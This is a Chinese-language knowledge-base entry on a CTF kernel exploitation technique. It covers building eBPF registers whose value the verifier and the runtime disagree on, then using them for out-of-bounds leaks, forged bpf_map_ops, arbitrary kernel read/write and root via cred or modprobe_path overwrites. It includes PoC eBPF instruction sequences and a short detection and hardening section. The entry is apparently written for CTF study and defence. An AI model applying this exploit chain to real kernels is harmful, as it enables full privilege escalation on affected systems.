---
id: binary-pwn-kernel-ebpf-verifier-inconsistent-register-arbitrary-rw
title: eBPF verifier 不一致寄存器构造与 OOB 任意读写提权（array_map_ops 劫持 / modprobe_path）
type: scenario
domain: binary
path: binary/pwn/kernel
technique: ebpf-verifier-inconsistent-register-arbitrary-rw
aliases:
- eBPF Pwn
- ebpf verifier bypass
- inconsistent register
- 不一致寄存器
- array_map_ops 劫持
- bpf_map_ops 伪造
- UofTCTF 2026 extended-eBPF
- d3bpf
- modprobe_path eBPF
tags:
- ebpf
- linux-kernel
- pwn
- verifier
- oob
- arbitrary-read-write
- bpf-map
- modprobe
- privilege-escalation
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V153
  verified_at: '2026-11-06T07:44:09+08:00'
  notes: 已对照原文与2张图核对：UofTCTF 2026 extended-eBPF 的 can_skip_alu_sanitation/is_safe_to_compute_dst_reg_range patch、ARSH umin_val 不一致寄存器（1 arsh 1：verifier 1/runtime 0, r9 verifier 0/runtime 1）、0xf8 OOB 读 map->ops 泄露 kbase、map_push_elem→array_map_get_next_key 4 字节写、modprobe_path 收尾；图2 显示 kernel_base=0xffffffff81000000、map_addr/victim_map_addr 与 FAKEFLAG；d3bpf RSH(&63)、d3bpf-v2 bpf_skb_load_bytes、ROL 32/64 位不一致、SECCON JIT 变体均与原文一致。路径/无 sources/source_url；原文内核版本(6.12.47/5.16.12)均为靶机环境而非受影响区间，未设 affected_versions。未验证点：未复跑 PoC，完整偏移需按目标内核校准。
---

## 一句话结论

eBPF Pwn 的核心是构造一个 verifier 与 runtime 认知不一致的寄存器（verifier 认为是 0、实际是 1，或反之）：先用它把指向 map value 的指针减到 `bpf_array`/`bpf_map` 头部，OOB 读出 `array_map_ops` 与 map 堆地址、算出 kernel base；再在 map value 中伪造 `bpf_map_ops` 并覆盖另一个 map 的 `ops` 指针，得到任意地址读写，最后覆盖 `modprobe_path` 或当前进程 `cred` 完成提权。

## 原理

- **verifier 与 runtime 是两套语义**：eBPF 程序先由 verifier 解释执行每条指令，跟踪 `struct bpf_reg_state` 的 `type`、`var_off`（tnum）、`smin/smax/umin/umax`、`s32/u32` 边界；通过后才由 JIT 编译为 x86 真正执行。只要补丁/漏洞让两边对某个操作的语义不一致，就能造出“verifier 认为安全、runtime 越界”的寄存器。
- **典型不一致点**：
  - RSH：verifier 认为移位位数 `>= insn_bitness` 时结果是已知 0；runtime 在 `core.c` 中执行 `DST >> (SRC & 63)`（或 `& 31`），实际移位数被掩码，结果不是 0。
  - ARSH：verifier 用 `umin_val` 去更新 `smin/smax`，当 `umin_val=0` 时认为 `1 >> 0 = 1`；runtime 实际按 1 移位得到 0。
  - ROL：verifier 用 `(DST << IMM) | (DST >> (64 - IMM))`，runtime 用 `(u32)DST << IMM | (u32)DST >> (32 - IMM)`，32 位与 64 位语义不同。
  - ALU Sanitation：低版本在边界减 1 时无符号回绕，或补丁直接 `can_skip_alu_sanitation` 返回 true，使指针加减不受限。
- **bpf_array 布局**：创建 `BPF_MAP_TYPE_ARRAY` 得到 `struct bpf_array { struct bpf_map map; u32 elem_size; u32 index_mask; struct bpf_array_aux *aux; union { char value[]; void *ptrs[]; }; }`。`bpf_map` 的第一个字段是 `const struct bpf_map_ops *ops`；因此 `ops` 位于 map 结构偏移 0，`value` 区域通常在 `0x110`（随内核版本/结构变化）。
- **OOB 读泄露**：`map_lookup_elem` 返回指向 `value` 的 `PTR_TO_MAP_VALUE`。用不一致寄存器减一个 verifier 认为是 0、runtime 是 `0x110` 的偏移，指针实际指回 `bpf_array` 头部；`BPF_LDX_MEM` 读出 `ops` 指针写回 value，用户态 `bpf_map_lookup_elem` 即可拿到 `array_map_ops`，减去已知偏移得到 `kbase`；同理读出 `map` 堆地址。
- **伪造 ops 获得任意读写**：在另一个 map 的 value 中按 `struct bpf_map_ops` 布局写入函数指针（`map_lookup_elem`、`map_update_elem`、`map_push_elem`、`map_free` 等），再通过同一个 OOB 写把目标 map 的 `ops` 改成该 value 地址。之后调用 `bpf_map_lookup_elem/update_elem` 就会走攻击者控制的函数指针。
- **任意读写实现**：常见两种：
  - 把 `map_lookup_elem` 换成 `array_of_map_gen_lookup`：该函数对 `array_map_lookup_elem` 的结果再解引用一次，verifier 以为返回 `PTR_TO_MAP_VALUE`，实际返回用户可控指针，从而读任意地址。
  - 把 `map_push_elem` 换成 `array_map_get_next_key`：修改 `map_type=BPF_MAP_TYPE_STACK`、`max_entries=0xffffffff`、`spin_lock_off=0`，调用 `map_update_elem` 时走 stack ops 的 `map_push_elem`，最终执行 `*(u32*)next_key = *(u32*)key + 1`，用 `value`/`flags` 控制地址与值，实现 4 字节写。
- **提权收尾**：拿到任意读写后，可读 `__per_cpu_offset + current_task` 找到当前 `task_struct`，把 `cred` 指针改成 `init_cred`；或把 `modprobe_path` 改成攻击者脚本路径，再执行一个未知格式文件触发 `call_modprobe`，以 root 执行脚本读取 flag。

## 触发条件

- 目标内核存在可被利用的 eBPF verifier/JIT 补丁或漏洞（CTF 题通常给出 patch；真实内核需对应 CVE）。
- 允许加载 eBPF 程序（`unprivileged_bpf_disabled=0`，或具备 `CAP_BPF`/`CAP_SYS_ADMIN`）；程序类型可为 `BPF_PROG_TYPE_SOCKET_FILTER` 并通过 `SO_ATTACH_BPF` 触发。
- 能创建 `BPF_MAP_TYPE_ARRAY`（以及必要时 `ARRAY_OF_MAPS`/`STACK`）map。
- 已知或可泄露 `array_map_ops`、`modprobe_path`、`init_cred`、`current_task` 等偏移；KASLR 开启时需要先泄露 kernel base。
- 目标未启用 `bpf_jit_harden` 等阻断，或漏洞位于 verifier 层不依赖 JIT。

## 利用步骤

1. **对比 verifier 与 runtime**：读题目 patch/内核源码，重点看 `adjust_scalar_min_max_vals`、`scalar_min_max_*`、`retrieve_ptr_limit`、`can_skip_alu_sanitation`、`core.c` 的 ALU 宏，找出移位/ROL/边界处理的不一致。
2. **构造不一致寄存器**：例如（UofTCTF 2026 extended-eBPF 的 ARSH 思路）：
   ```c
   BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),          // r7 = map value ptr
   BPF_LDX_MEM(BPF_W, BPF_REG_8, BPF_REG_7, 0),  // r8 = *(u32*)value (runtime 1)
   BPF_ALU64_IMM(BPF_AND, BPF_REG_8, 1),         // verifier: r8 ∈ [0,1]
   BPF_MOV64_IMM(BPF_REG_0, 1),
   BPF_ALU64_REG(BPF_ARSH, BPF_REG_0, BPF_REG_8),// verifier 认为 1>>0=1；runtime 1>>1=0
   BPF_MOV64_IMM(BPF_REG_9, 1),
   BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_0), // verifier 认为 0；runtime 1
   ```
   或（d3bpf 的 RSH 思路）`r0=0x110; r1=64; r0 >>= r1`，verifier 认为 0，runtime 仍为 `0x110`。
3. **OOB 泄露 ops 与 map 地址**：用上一步的 `r9` 乘偏移，从 `map value` 指针减去它，`BPF_LDX_MEM` 读 `*(map_ptr - 0x110)`（即 `ops`）和 `*(map_ptr + 0xc0)` 等字段，写回 value 供用户态读取。
4. **计算 kbase**：`kbase = array_map_ops - ARRAY_MAP_OPS_OFFSET`；同时得到 `map_ptr` 与 `map_ptr_values`。
5. **伪造 fake ops**：在可控 map 的 value 中按 `bpf_map_ops` 布局写入目标函数地址（如 `array_map_update_elem`、`array_map_lookup_elem`、`array_of_map_gen_lookup`、`array_map_free`），并按需覆盖 `map_push_elem`。
6. **覆盖目标 map 的 ops**：再次用不一致寄存器把目标 map 的 `ops` 指针写成 fake ops 的 value 地址；必要时同时改 `map_type`、`max_entries`、`spin_lock_off` 以走到目标虚函数。
7. **任意读写**：通过 `bpf_map_lookup_elem`/`bpf_map_update_elem` 调用被劫持的 ops，实现读任意地址/写任意地址（4 或 8 字节）。
8. **提权**：读 `__per_cpu_offset` + `current_task` 得到当前 `task_struct`，`arb_write(task + CRED_OFFSET, init_cred)`；或写 `modprobe_path` 为脚本路径并触发 `call_modprobe`；最后 `system("/bin/sh")` 或读 flag。

## PoC

核心不一致寄存器与泄露（UofTCTF 2026 extended-eBPF 思路）：

```c
BPF_ST_MEM(BPF_W, BPF_REG_10, -4, 0),
BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
BPF_LD_MAP_FD(BPF_REG_1, map_fd),
BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),   // r0 = map value ptr
BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
BPF_EXIT_INSN(),

BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),       // r6 = value ptr
BPF_MOV64_IMM(BPF_REG_0, 0),
BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_6, 0), // r7 = *(u64*)value, runtime 1
BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1),         // verifier r7 ∈ [0,1]
BPF_MOV64_IMM(BPF_REG_8, 1),
BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_7),// verifier 1, runtime 0
BPF_MOV64_IMM(BPF_REG_9, 1),
BPF_ALU64_REG(BPF_SUB, BPF_REG_9, BPF_REG_8), // verifier 0, runtime 1
BPF_ALU64_IMM(BPF_MUL, BPF_REG_9, 0xf8),      // runtime offset 0xf8
BPF_MOV64_REG(BPF_REG_7, BPF_REG_6),
BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_9), // r7 = map_ptr - 0xf8 (ops)
BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0), // r8 = ops
BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0), // value[0] = ops
```

任意写（4 字节，`array_map_get_next_key` 路径）：

```c
// fake ops 中 map_push_elem -> array_map_get_next_key (kbase + 0x1d3b40)
// 目标 map: map_type=BPF_MAP_TYPE_STACK, max_entries=0xffffffff, spin_lock_off=0
bpf_map_update_elem(map_fd, 0, &value, flags); // *(u32*)flags = *(u32*)value + 1
```

提权收尾（示意）：

```c
uint64_t current_task_struct = arb_read(arb_read(__per_cpu_offset) + current_task);
uint64_t init_cred = kbase + INIT_CRED_OFFSET;
arb_write(current_task_struct + CRED_OFFSET, init_cred);
system("/bin/sh");
```

说明：以上为文章 UofTCTF 2026 extended-eBPF 打法的精简，完整偏移需按目标内核调整；文章未在本机复跑，PoC 未执行。真实内核利用需对应具体 CVE。

## 变体与关联

- **RSH 不一致**（D^3CTF 2022 d3bpf）：patch 把 `umax_val >= insn_bitness` 改为 `umin_val >= insn_bitness`，verifier 把越界右移标记为已知 0，runtime 仍按 `& 63` 执行。
- **ARSH 不一致**（UofTCTF 2026 extended-eBPF）：`scalar_min_max_arsh` 用 `umin_val` 计算边界，导致 verifier 与实际值相反；同时 patch `can_skip_alu_sanitation` 返回 true、`is_safe_to_compute_dst_reg_range` 放宽。
- **ROL 不一致**（DownUnderCTF 2025 Rolling Around）：32 位 rol 在 verifier 用 `>> (64 - IMM)`，runtime 用 `>> (32 - IMM)`；`dst=2; dst rol 31` 即可构造差异。
- **bpf_skb_load_bytes 栈溢出**（d3bpf-v2，内核 5.16.12）：高版本 ALU sanitation 加强后，改用 helper 把 socket 数据拷贝到 bpf 栈，`len` 用不一致寄存器构造为大于栈长度，造成栈溢出后 ROP。
- **JIT 路径**（SECCON 2021 kone_gadget）：`bpf` 系统调用被禁但 JIT 开启时，用 `prctl` 写入 seccomp BPF 程序，JIT 编译后在内存中形成可控 x86 指令；利用自定义 syscall 跳转到 JIT 代码。该路径与 verifier 利用不同，原文仅复述参考文章、未给出可运行 exp。
- 关联：[[binary-pwn-kernel-qemu-initramfs-gdb-workflow]]（CTF 内核调试环境）、[[binary-pwn-kernel-cve-2024-1086-nft-verdict-double-free-dirty-pagetable-modprobe]]（modprobe_path 收尾）、[[binary-pwn-kernel-dirty-pagetable-pmd-pte-overlap-physical-rw]]（内核任意物理读写）。
- 边界：内核已修复对应 verifier 缺陷、`unprivileged_bpf_disabled=2` 且无 CAP_BPF、`bpf_jit_harden` 开启、缺少 map 偏移/内核符号泄露时，本链不成立或需换其他入口。

## 检测与防御

- **内核侧**：保持内核更新，关注 eBPF verifier 的 CVE/补丁；生产环境设置 `kernel.unprivileged_bpf_disabled=2`，仅授予可信进程 `CAP_BPF`；开启 `bpf_jit_harden`、`bpf_jit_kallsyms=0`，限制 JIT 信息泄露。
- **运行时检测**：监控异常的 `BPF_PROG_LOAD`（大量失败尝试、超大指令数、可疑移位/ALU 组合）、频繁创建/销毁 map、map ops 指针被改写（内核完整性监控）、`modprobe_path` 变更、`call_modprobe` 异常触发、进程 cred 被替换。
- **CTF/研究侧**：先 `diff` patch 找 verifier 与 `core.c` 的语义差；用 verifier log（`log_level=2`）观察寄存器状态；用 QEMU + gdb 在 `sk_filter_trim_cap` 的 `call rax` 处断下看 JIT 代码；把 `array_map_ops`、`modprobe_path`、`init_cred` 偏移写进 exp 前先用 `/proc/kallsyms` 或泄露值校准。
- **边界**：eBPF Pwn 依赖题目 patch/内核漏洞，不是通用提权；真实环境中的 verifier 绕过通常对应具体 CVE，需按版本匹配。
